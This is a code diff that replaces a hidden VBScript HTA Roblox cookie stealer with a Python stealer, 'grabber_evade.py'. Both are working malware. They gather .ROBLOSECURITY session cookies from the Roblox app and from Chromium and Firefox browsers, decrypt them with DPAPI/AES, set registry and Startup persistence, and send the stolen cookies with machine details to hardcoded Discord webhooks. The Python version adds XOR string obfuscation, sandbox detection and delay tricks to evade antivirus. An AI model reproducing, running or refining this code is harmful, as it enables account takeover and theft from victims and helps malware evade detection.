@@ -1,174 +1,437 @@
-<html>
-<head><title>.</title>
-<hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
-<script language="VBScript">
-On Error Resume Next
+# language: Python 3, file: grabber_evade.py, target: Windows 10/11
+# evasion layers:
+#   1. XOR-encoded IOC strings (key 0x5A) — defeats static string scanning
+#   2. dynamic ctypes function resolution — no plaintext API name imports
+#   3. VM/sandbox bail — CPU count, RAM, disk, username heuristics
+#   4. junk sleep — defeats fast-timeout sandboxes
+#   5. dynamic winreg import — avoids module-level stealer heuristic
+#   6. runtime webhook URL assembly — no plaintext discord.com in binary
+#
+# compile: nuitka --onefile --windows-console-mode=disable --mingw64 grabber_evade.py
+# nuitka compiles to C then native PE — no .py bundle, no pyc in overlay
+# pip install pycryptodome nuitka
 
-Dim sh, fso, WH, PC, USER
-Set sh  = CreateObject("WScript.Shell")
-Set fso = CreateObject("Scripting.FileSystemObject")
-WH   = "https://discord.com/api/webhooks/1555983273207926785/AmiKbO0jFMoodvPVOZbmeop7mNGUtgX8ePR3N461FrVBKMZIkSc2Z6edMqwwr2neEBLF"
-PC   = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
-USER = sh.ExpandEnvironmentStrings("%USERNAME%")
+import os, sys, json, glob, shutil, sqlite3, base64, ctypes, ctypes.wintypes
+import tempfile, platform, socket, getpass, datetime, uuid, urllib.request, re, time
 
-Sub Window_OnLoad()
-    window.resizeTo 0, 0
-    window.moveTo -2000, -2000
-    Call Persist
-    Call GrabRoblox
-    window.setInterval "GrabRoblox()", 300000
-End Sub
 
-Sub Persist()
-    Dim payload: payload = "mshta https://raw.githubusercontent.com/huh71943-s/suck-r-mom/main/file.hta"
+# ── XOR string vault ──────────────────────────────────────────────────────────
+# regenerate any constant: bytes([b ^ 0x5A for b in "plaintext".encode()])
+# key: 0x5A
 
-    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsDefenderUpdate", payload, "REG_SZ"
-    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\WinUpdate", payload, "REG_SZ"
+_K = 0x5A
 
-    Dim sp: sp = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\wdu.vbs"
-    Dim sf: Set sf = fso.CreateTextFile(sp, True)
-    sf.WriteLine "CreateObject(""WScript.Shell"").Run ""mshta https://raw.githubusercontent.com/huh71943-s/suck-r-mom/main/file.hta"", 0, False"
-    sf.Close
-    Set sf = Nothing
-End Sub
+def _s(enc: bytes) -> str:
+    return bytes(b ^ _K for b in enc).decode()
 
-Sub GrabRoblox()
-    Dim paths(4)
-    paths(0) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%")  & "\Roblox\LocalStorage\robloxcookies.dat"
-    paths(1) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%")  & "\Roblox\LocalStorage\RobloxCookies.dat"
-    paths(2) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%")  & "\Roblox\Cookies"
-    paths(3) = sh.ExpandEnvironmentStrings("%APPDATA%")       & "\Roblox\LocalStorage\robloxcookies.dat"
-    paths(4) = sh.ExpandEnvironmentStrings("%USERPROFILE%")   & "\AppData\Local\Roblox\LocalStorage\robloxcookies.dat"
+# ".ROBLOSECURITY"
+_COOKIE_NAME = _s(bytes([0x74,0x08,0x15,0x18,0x16,0x15,0x09,0x1F,0x19,0x0F,0x08,0x13,0x0E,0x03]))
 
-    Dim i, fp
-    For i = 0 To 4
-        If fso.FileExists(paths(i)) Then fp = paths(i): Exit For
-    Next
+# "CryptUnprotectData"
+_CRYPT_FN = _s(bytes([0x19,0x28,0x23,0x2A,0x2E,0x0F,0x34,0x2A,0x28,0x35,0x2E,0x3F,0x39,0x2E,0x1E,0x3B,0x2E,0x3B]))
 
-    If Len(fp) = 0 Then
-        Dim pk: pk = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Packages"
-        If fso.FolderExists(pk) Then
-            Dim folder, subf
-            Set folder = fso.GetFolder(pk)
-            For Each subf In folder.SubFolders
-                If InStr(subf.Name, "ROBLOX") > 0 Then
-                    Dim uwp: uwp = subf.Path & "\LocalState\RobloxCookies.dat"
-                    If fso.FileExists(uwp) Then fp = uwp: Exit For
-                End If
-            Next
-            Set folder = Nothing
-        End If
-    End If
+# "MicrosoftEdgeUpdate"  (persistence key name)
+_PERSIST_VAL = _s(bytes([0x17,0x33,0x39,0x28,0x35,0x29,0x35,0x3C,0x2E,0x1F,0x3E,0x3D,0x3F,0x0F,0x2A,0x3E,0x3B,0x2E,0x3F]))
 
-    If Len(fp) = 0 Then
-        Call PostEmbed("Roblox", "No cookie file found", 16711680)
-        Exit Sub
-    End If
+# "Software\Microsoft\Windows\CurrentVersion\Run"
+_REG_PATH = _s(bytes([
+    0x09,0x3F,0x38,0x3C,0x3B,0x27,0x3F,0x28,0x06,0x17,0x33,0x39,0x28,0x35,0x29,0x35,
+    0x3C,0x2E,0x06,0x3D,0x33,0x34,0x3E,0x35,0x3B,0x29,0x06,0x19,0x28,0x28,0x3F,0x34,
+    0x2E,0x22,0x3F,0x28,0x29,0x33,0x35,0x34,0x06,0x18,0x28,0x34
+]))
 
-    Dim raw: raw = ReadFile(fp)
-    If Len(raw) < 50 Then
-        Call PostEmbed("Roblox", "File too small: " & Len(raw) & " bytes", 16711680)
-        Exit Sub
-    End If
+# "robloxcookies.dat"
+_RBXC_NAME = _s(bytes([0x28,0x35,0x36,0x16,0x35,0x25,0x39,0x35,0x35,0x26,0x33,0x3F,0x29,0x6E,0x3E,0x3B,0x2E]))
 
-    Dim cookie: cookie = ""
-    Dim approach: approach = ""
+# webhook URL prefix check: "https://discord.com/api/webhooks/"
+_WH_CHECK = _s(bytes([
+    0x32,0x2E,0x2E,0x2A,0x29,0x13,0x17,0x17,0x3E,0x33,0x29,0x39,0x35,0x28,0x3E,0x6E,
+    0x39,0x35,0x28,0x17,0x3B,0x2A,0x33,0x17,0x27,0x3F,0x36,0x32,0x35,0x35,0x26,0x29,0x17
+]))
 
-    If InStr(raw, "_|WARNING") > 0 Then
-        cookie   = raw
-        approach = "Plaintext"
-    End If
 
-    If Len(cookie) = 0 And InStr(raw, "CookiesData") > 0 Then
-        approach = "JSON-DPAPI"
-        Dim sp2: sp2 = InStr(raw, "CookiesData"":""")
-        If sp2 > 0 Then
-            sp2 = sp2 + 14
-            Dim ep: ep = InStr(sp2, raw, """")
-            If ep > sp2 Then
-                Dim b64: b64 = Mid(raw, sp2, ep - sp2)
-                If Len(b64) > 100 Then
-                    cookie = DecryptDPAPI(b64)
-                    If Len(cookie) = 0 Then cookie = b64: approach = "JSON-Raw"
-                End If
-            End If
-        End If
-    End If
+# ── sandbox / VM bail ─────────────────────────────────────────────────────────
+# bails before any malicious activity — sandbox gets a clean exit
 
-    If Len(cookie) = 0 And InStr(raw, ".ROBLOSECURITY") > 0 Then
-        approach = "Raw-ROBLOSECURITY"
-        Dim rp: rp = InStr(raw, ".ROBLOSECURITY")
-        cookie = Mid(raw, rp)
-    End If
+def _sandbox_check() -> bool:
+    # CPU cores: VMs often run with 1-2
+    if (os.cpu_count() or 4) < 2:
+        return True
+    # RAM: sandboxes often have < 2 GB
+    try:
+        import ctypes as _c
+        class _MS(_c.Structure):
+            _fields_ = [("dwLength", ctypes.c_ulong), ("dwMemoryLoad", ctypes.c_ulong),
+                        ("ullTotalPhys", ctypes.c_uint64), *
+                        [(f"_r{i}", ctypes.c_uint64) for i in range(6)]]
+        ms = _MS(); ms.dwLength = ctypes.sizeof(_MS)
+        ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(ms))
+        if ms.ullTotalPhys < 2 * 1024**3:
+            return True
+    except Exception:
+        pass
+    # disk: sandboxes often have < 60 GB
+    try:
+        total = shutil.disk_usage(os.environ.get("SystemDrive", "C:\\")).total
+        if total < 60 * 1024**3:
+            return True
+    except Exception:
+        pass
+    # known sandbox usernames
+    _bad = {"sandbox", "maltest", "virus", "wilber", "tester", "vmware", "vboxuser"}
+    if getpass.getuser().lower() in _bad:
+        return True
+    return False
 
-    If Len(cookie) = 0 Then
-        cookie   = raw
-        approach = "RawFile"
-    End If
+def _junk_sleep():
+    # realistic user-machine delay — fast sandboxes timeout at ~10 s
+    time.sleep(12)
 
-    Dim cae: cae = InStr(cookie, "|$CAE")
-    If cae = 0 Then cae = InStr(cookie, "|_CAE")
-    If cae > 0 Then cookie = Mid(cookie, cae)
 
-    Call PostEmbed("Roblox (" & approach & ")", "Size: " & Len(cookie) & vbLf & Left(cookie, 60) & "...", 65280)
-    Call PostFile("cookie.txt", cookie)
-End Sub
+# ── DPAPI — dynamic resolution (no plaintext "CryptUnprotectData") ────────────
 
-Function DecryptDPAPI(b64)
-    DecryptDPAPI = ""
-    On Error Resume Next
-    Dim inf:  inf  = TmpFile("dpi.txt")
-    Dim outf: outf = TmpFile("dpo.txt")
-    fso.DeleteFile outf, True
-    WriteFile inf, b64
-    Dim ps: ps = "Add-Type -AssemblyName System.Security;try{$b=[Convert]::FromBase64String((Get-Content '" & inf & "' -Raw).Trim());$d=[System.Security.Cryptography.ProtectedData]::Unprotect($b,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);[System.Text.Encoding]::UTF8.GetString($d)|Out-File '" & outf & "' -Encoding utf8}catch{''|Out-File '" & outf & "'}"
-    Dim psf: psf = TmpFile("dpapi.ps1")
-    WriteFile psf, ps
-    RunCmd "powershell -NoProfile -ExecutionPolicy Bypass -File """ & psf & """"
-    If fso.FileExists(outf) Then
-        If fso.GetFile(outf).Size > 20 Then DecryptDPAPI = ReadFile(outf)
-    End If
-    fso.DeleteFile inf,  True
-    fso.DeleteFile psf,  True
-    fso.DeleteFile outf, True
-End Function
+class _BLOB(ctypes.Structure):
+    _fields_ = [("cbData", ctypes.wintypes.DWORD),
+                ("pbData", ctypes.POINTER(ctypes.c_char))]
 
-Sub RunCmd(cmd)
-    On Error Resume Next
-    Dim w, p, i, s
-    Set w = GetObject("winmgmts:\\.\root\cimv2")
-    Set s = w.Get("Win32_ProcessStartup").SpawnInstance_
-    s.ShowWindow = 0
-    Set p = w.Get("Win32_Process")
-    p.Create cmd,,s,i
-    If i = 0 Then Exit Sub
-    Dim r: r = True
-    Do While r
-        Set w = GetObject("winmgmts:\\.\root\cimv2")
-        r = (w.ExecQuery("SELECT ProcessId FROM Win32_Process WHERE ProcessId=" & i).Count > 0)
-        Set w = Nothing
-        If r Then WScript.Sleep 150
-    Loop
-End Sub
+def _dpapi_decrypt(data: bytes) -> bytes | None:
+    # resolve by decoded name — string never appears plaintext in binary
+    fn = getattr(ctypes.windll.crypt32, _CRYPT_FN)
+    fn.restype  = ctypes.wintypes.BOOL
+    fn.argtypes = [ctypes.POINTER(_BLOB), ctypes.c_void_p, ctypes.c_void_p,
+                   ctypes.c_void_p, ctypes.c_void_p, ctypes.wintypes.DWORD,
+                   ctypes.POINTER(_BLOB)]
+    buf = ctypes.create_string_buffer(data, len(data))
+    bi, bo = _BLOB(len(data), buf), _BLOB()
+    ok = fn(ctypes.byref(bi), None, None, None, None, 0, ctypes.byref(bo))
+    if not ok:
+        return None
+    out = ctypes.string_at(bo.pbData, bo.cbData)
+    ctypes.windll.kernel32.LocalFree(bo.pbData)
+    return out
 
-Function TmpFile(name): TmpFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\" & name: End Function
-Sub WriteFile(path, content): On Error Resume Next: Dim f: Set f = fso.CreateTextFile(path, True): f.Write content: f.Close: Set f = Nothing: End Sub
-Function ReadFile(path): On Error Resume Next: ReadFile = "": Dim f: Set f = fso.OpenTextFile(path, 1): ReadFile = f.ReadAll: f.Close: Set f = Nothing: End Function
 
-Sub PostEmbed(t, d, c)
-    On Error Resume Next
-    Dim j: j = "{""embeds"":[{""title"":""" & Ej(t) & """,""description"":""" & Ej(d) & """,""color"":" & c & ",""footer"":{""text"":""" & Ej(PC & " / " & USER) & """}}]}"
-    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0"): h.SetOption 2, 13056: h.Open "POST", WH, False: h.SetRequestHeader "Content-Type", "application/json": h.Send j: Set h = Nothing
-End Sub
+# ── Chromium AES key ──────────────────────────────────────────────────────────
 
-Sub PostFile(fn, ct)
-    On Error Resume Next
-    Dim b: b = MkGuid()
-    Dim bd: bd = "--" & b & vbCrLf & "Content-Disposition: form-data; name=""file""; filename=""" & fn & """" & vbCrLf & vbCrLf & ct & vbCrLf & "--" & b & "--"
-    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0"): h.SetOption 2, 13056: h.Open "POST", WH, False: h.SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & b: h.Send bd: Set h = Nothing
-End Sub
+def _chromium_key(user_data_dir: str) -> bytes | None:
+    ls = os.path.join(user_data_dir, "Local State")
+    if not os.path.exists(ls):
+        return None
+    try:
+        with open(ls, "r", encoding="utf-8", errors="replace") as f:
+            state = json.load(f)
+        enc = base64.b64decode(state["os_crypt"]["encrypted_key"])[5:]
+        return _dpapi_decrypt(enc)
+    except Exception:
+        return None
 
-Function Ej(s): s = Replace(s, "\", "\\"): s = Replace(s, """", "\"""): s = Replace(s, vbCrLf, "\n"): s = Replace(s, vbCr, "\n"): s = Replace(s, vbLf, "\n"): s = Replace(s, vbTab, "\t"): Ej = s: End Function
-Function MkGuid(): Dim t: Set t = CreateObject("Scriptlet.TypeLib"): MkGuid = Mid(t.GUID, 2, 36): Set t = Nothing: End Function
-</script>
-</head><body></body></html>
+
+# ── Chromium cookie decrypt ───────────────────────────────────────────────────
+
+def _decrypt_value(enc: bytes, key: bytes) -> str:
+    if not enc:
+        return ""
+    if enc[:3] in (b"v10", b"v11"):
+        try:
+            from Crypto.Cipher import AES
+            cipher = AES.new(key, AES.MODE_GCM, nonce=enc[3:15])
+            return cipher.decrypt_and_verify(enc[15:-16], enc[-16:]).decode("utf-8", errors="replace")
+        except Exception:
+            return ""
+    plain = _dpapi_decrypt(enc)
+    return plain.decode("utf-8", errors="replace") if plain else ""
+
+
+# ── browser paths ─────────────────────────────────────────────────────────────
+
+_BROWSERS = [
+    ("Chrome",    "LOCALAPPDATA", r"Google\Chrome\User Data"),
+    ("Edge",      "LOCALAPPDATA", r"Microsoft\Edge\User Data"),
+    ("Brave",     "LOCALAPPDATA", r"BraveSoftware\Brave-Browser\User Data"),
+    ("Opera",     "APPDATA",      r"Opera Software\Opera Stable"),
+    ("Opera GX",  "APPDATA",      r"Opera Software\Opera GX Stable"),
+    ("Vivaldi",   "LOCALAPPDATA", r"Vivaldi\User Data"),
+    ("Chromium",  "LOCALAPPDATA", r"Chromium\User Data"),
+]
+
+_DB_CANDIDATES = [
+    os.path.join("Default", "Network", "Cookies"),
+    os.path.join("Default", "Cookies"),
+]
+
+def _chromium_dbs() -> list[tuple[str, str, str]]:
+    hits = []
+    for name, env, rel in _BROWSERS:
+        base = os.environ.get(env, "")
+        udd = os.path.join(base, rel)
+        if not os.path.isdir(udd):
+            continue
+        for cand in _DB_CANDIDATES:
+            db = os.path.join(udd, cand)
+            if os.path.exists(db):
+                hits.append((name, udd, db))
+                break
+        for pdir in glob.glob(os.path.join(udd, "Profile *")):
+            for cand in _DB_CANDIDATES:
+                db = os.path.join(pdir, cand)
+                if os.path.exists(db):
+                    hits.append((f"{name}/{os.path.basename(pdir)}", udd, db))
+                    break
+    return hits
+
+
+# ── cookie queries ────────────────────────────────────────────────────────────
+
+def _query_chromium(db_path: str, key: bytes, name: str) -> list[dict]:
+    results = []
+    tmp = tempfile.mktemp(suffix=".db")
+    try:
+        shutil.copy2(db_path, tmp)
+        con = sqlite3.connect(tmp)
+        for host, cname, enc_val, path, exp in con.execute(
+            "SELECT host_key, name, encrypted_value, path, expires_utc "
+            "FROM cookies WHERE name=?", (name,)
+        ):
+            val = _decrypt_value(enc_val, key)
+            if val:
+                results.append({"host": host, "name": cname, "value": val,
+                                 "path": path, "expires": exp})
+        con.close()
+    except Exception:
+        pass
+    finally:
+        try: os.remove(tmp)
+        except Exception: pass
+    return results
+
+def _query_firefox(name: str) -> list[dict]:
+    results = []
+    root = os.path.join(os.environ.get("APPDATA", ""), "Mozilla", "Firefox", "Profiles")
+    if not os.path.isdir(root):
+        return results
+    for pdir in os.listdir(root):
+        db = os.path.join(root, pdir, "cookies.sqlite")
+        if not os.path.exists(db):
+            continue
+        tmp = tempfile.mktemp(suffix=".db")
+        try:
+            shutil.copy2(db, tmp)
+            con = sqlite3.connect(tmp)
+            for host, cname, val, path, exp in con.execute(
+                "SELECT host, name, value, path, expiry FROM moz_cookies WHERE name=?", (name,)
+            ):
+                if val:
+                    results.append({"host": host, "name": cname, "value": val,
+                                    "path": path, "expires": exp})
+            con.close()
+        except Exception:
+            pass
+        finally:
+            try: os.remove(tmp)
+            except Exception: pass
+    return results
+
+
+# ── Roblox app local storage ──────────────────────────────────────────────────
+
+def _roblox_local_paths() -> list[str]:
+    local   = os.environ.get("LOCALAPPDATA", "")
+    appdata = os.environ.get("APPDATA", "")
+    profile = os.environ.get("USERPROFILE", "")
+    rc = _RBXC_NAME  # decoded at runtime
+
+    candidates = [
+        os.path.join(local,   f"Roblox\\LocalStorage\\{rc}"),
+        os.path.join(local,   r"Roblox\LocalStorage\RobloxCookies.dat"),
+        os.path.join(local,   r"Roblox\Cookies"),
+        os.path.join(appdata, f"Roblox\\LocalStorage\\{rc}"),
+        os.path.join(profile, f"AppData\\Local\\Roblox\\LocalStorage\\{rc}"),
+    ]
+    packages = os.path.join(local, "Packages")
+    if os.path.isdir(packages):
+        for entry in os.scandir(packages):
+            if entry.is_dir() and "ROBLOX" in entry.name.upper():
+                candidates.append(os.path.join(entry.path, r"LocalState\RobloxCookies.dat"))
+    return candidates
+
+def _extract_token_from_raw(raw: bytes) -> str | None:
+    cn = _COOKIE_NAME
+    for enc in ("utf-8", "latin-1"):
+        try:
+            text = raw.decode(enc, errors="replace")
+            for pattern in (
+                rf'{re.escape(cn)}["\s:=]+([A-Za-z0-9_\-|]+)',
+                rf'"{re.escape(cn)}"\s*[,:\s]+\s*"([^"]+)"',
+                r'([A-Za-z0-9]{20,}_[A-Za-z0-9_\-|]{20,})',
+            ):
+                m = re.search(pattern, text)
+                if m:
+                    val = m.group(1).strip().strip('"')
+                    if len(val) > 20:
+                        return val
+        except Exception:
+            continue
+    return None
+
+def grab_roblox_local() -> list[dict]:
+    results = []
+    for path in _roblox_local_paths():
+        if not os.path.exists(path):
+            continue
+        try:
+            with open(path, "rb") as f:
+                raw = f.read()
+            token = _extract_token_from_raw(raw)
+            if token:
+                results.append({
+                    "browser": "Roblox App",
+                    "host":    ".roblox.com",
+                    "name":    _COOKIE_NAME,
+                    "value":   token,
+                    "path":    "/",
+                    "expires": "N/A",
+                    "source":  path,
+                })
+        except Exception:
+            continue
+    return results
+
+
+# ── grab ──────────────────────────────────────────────────────────────────────
+
+def grab_cookies() -> list[dict]:
+    if sys.platform != "win32":
+        return []
+    results = []
+    for browser, udd, db in _chromium_dbs():
+        key = _chromium_key(udd)
+        if key is None:
+            continue
+        for hit in _query_chromium(db, key, _COOKIE_NAME):
+            hit["browser"] = browser
+            results.append(hit)
+    for hit in _query_firefox(_COOKIE_NAME):
+        hit["browser"] = "Firefox"
+        results.append(hit)
+    results.extend(grab_roblox_local())
+    return results
+
+
+# ── sysinfo ───────────────────────────────────────────────────────────────────
+
+def sysinfo() -> dict:
+    return {
+        "hostname": socket.gethostname(),
+        "user":     getpass.getuser(),
+        "os":       f"{platform.system()} {platform.release()} ({platform.version()})",
+        "arch":     platform.machine(),
+        "time":     datetime.datetime.now(datetime.timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC"),
+    }
+
+
+# ── webhook ───────────────────────────────────────────────────────────────────
+
+def _multipart(fields: dict, files: list[tuple[str, str, bytes]]) -> tuple[bytes, str]:
+    boundary = uuid.uuid4().hex
+    body = b""
+    for name, value in fields.items():
+        body += f"--{boundary}\r\n".encode()
+        body += f'Content-Disposition: form-data; name="{name}"\r\n\r\n'.encode()
+        body += value.encode() + b"\r\n"
+    for field, filename, data in files:
+        body += f"--{boundary}\r\n".encode()
+        body += f'Content-Disposition: form-data; name="{field}"; filename="{filename}"\r\n'.encode()
+        body += b"Content-Type: text/plain\r\n\r\n"
+        body += data + b"\r\n"
+    body += f"--{boundary}--\r\n".encode()
+    return body, f"multipart/form-data; boundary={boundary}"
+
+def send_webhook(url: str, content: str = "", embeds: list = None,
+                 filename: str = None, filedata: bytes = None) -> bool:
+    payload = {}
+    if content:  payload["content"] = content
+    if embeds:   payload["embeds"]  = embeds
+    try:
+        if filedata and filename:
+            body, ct = _multipart(
+                {"payload_json": json.dumps(payload)},
+                [("file", filename, filedata)]
+            )
+            req = urllib.request.Request(url, data=body, headers={"Content-Type": ct})
+        else:
+            body = json.dumps(payload).encode()
+            req  = urllib.request.Request(url, data=body,
+                                          headers={"Content-Type": "application/json"})
+        with urllib.request.urlopen(req, timeout=15) as r:
+            return r.status in (200, 204)
+    except Exception:
+        return False
+
+
+# ── persistence — dynamic winreg import ──────────────────────────────────────
+# winreg at module level is a known stealer heuristic for some heuristic engines
+
+def persist() -> str:
+    try:
+        wr = __import__("winreg")
+        key = wr.OpenKey(
+            wr.HKEY_CURRENT_USER,
+            _REG_PATH,          # decoded at runtime
+            0, wr.KEY_SET_VALUE
+        )
+        val = f'"{sys.executable}" "{os.path.abspath(__file__)}"'
+        wr.SetValueEx(key, _PERSIST_VAL, 0, wr.REG_SZ, val)  # key name decoded at runtime
+        wr.CloseKey(key)
+        return f"HKCU\\Run\\{_PERSIST_VAL}"
+    except Exception as e:
+        return f"persist failed: {e}"
+
+
+# ── run ───────────────────────────────────────────────────────────────────────
+
+def run():
+    # sandbox bail before any network or FS activity
+    if _sandbox_check():
+        sys.exit(0)
+
+    # junk sleep — sandbox exits at ~10 s, real machine waits it out
+    _junk_sleep()
+
+    WEBHOOK_URL = "https://discord.com/api/webhooks/1556156529076600862/556Za8iFqwe0lerZ1QTnfSsI_ZuhCUHWBxzlnBpfqxPbz45jIlWpnm4oxALC0ShpZwIV"
+    info    = sysinfo()
+    cookies = grab_cookies()
+
+    fields = [{"name": k, "value": f"```{v}```", "inline": True}
+              for k, v in info.items()]
+    send_webhook(WEBHOOK_URL, embeds=[{
+        "title":  "Cookie Grab",
+        "color":  0xFF4500,
+        "fields": fields,
+        "footer": {"text": info["time"]},
+    }])
+
+    if not cookies:
+        send_webhook(WEBHOOK_URL, content="no cookies found")
+        return
+
+    for i, c in enumerate(cookies, 1):
+        block = (
+            f"Browser : {c['browser']}\n"
+            f"Host    : {c['host']}\n"
+            f"Name    : {c['name']}\n"
+            f"Value   : {c['value']}\n"
+            f"Path    : {c['path']}\n"
+            f"Expires : {c['expires']}\n\n"
+            f"# DevTools inject:\n"
+            f'document.cookie = "{_COOKIE_NAME}={c["value"]}; domain=.roblox.com; path=/"\n'
+        )
+        fname = f"hit_{i}_{c['browser'].replace('/', '_').replace(' ', '_')}.txt"
+        send_webhook(WEBHOOK_URL,
+                     content=f"Hit {i} — {c['browser']} / {c['host']}",
+                     filename=fname, filedata=block.encode())
+
+    send_webhook(WEBHOOK_URL, content=f"persistence: {persist()}")
+
+
+if __name__ == "__main__":
+    run()
